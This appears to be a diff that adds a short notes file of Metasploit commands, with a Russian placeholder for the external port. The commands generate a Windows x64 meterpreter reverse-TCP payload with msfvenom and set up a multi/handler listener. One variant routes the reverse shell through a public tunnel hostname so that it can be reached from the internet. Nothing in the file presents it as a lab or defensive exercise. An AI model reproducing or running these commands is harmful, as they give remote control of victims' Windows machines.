@@ -1,0 +1,9 @@
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.16 LPORT=4444 -f python
+msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 192.168.1.16; set lport 4444; exploit"
+
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST drsqv-178-90-252-216.run.pinggy-free.link
+set LPORT ВАШ_ВНЕШНИЙ_ПОРТ
+set ReverseListenerBindAddress 127.0.0.1
+set ReverseListenerBindPort 4444
